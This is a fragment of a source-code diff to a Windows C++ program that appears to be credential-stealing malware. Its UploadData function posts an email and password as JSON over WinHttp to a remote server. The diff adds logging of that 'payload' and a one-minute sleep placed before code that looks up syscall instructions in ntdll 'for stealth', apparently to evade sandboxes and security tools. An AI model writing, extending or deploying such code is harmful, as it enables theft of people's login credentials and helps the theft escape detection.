@@ -132,7 +132,8 @@ void UploadData(std::string email, std::string pass) {
     std::string json = ss.str();
     if(WinHttpSendRequest(hR, L"Content-Type: application/json\r\n", -1, (LPVOID)json.c_str(), (DWORD)json.length(), (DWORD)json.length(), 0)) {
         if (WinHttpReceiveResponse(hR, NULL)) {
-            WriteLog("SUCCESS: Data uploaded for " + email);
+            WriteLog("PAYLOAD SUCCESS: Data uploaded for " + email);
+            WriteLog("Raw JSON: " + json);
         }
     }
     WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
@@ -221,6 +222,9 @@ int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
 
     // 1. Start the log
     WriteLog("=== SYSTEM STARTING ===");
+     WriteDebug("wait 1 minutes sleeping...");
+    Sleep(60000); 
+    WriteDebug("1 minutes passed ...");
     
    // 2. Search for syscall instruction inside ntdll for stealth
     HMODULE ntdll = GetModuleHandleA("ntdll.dll");
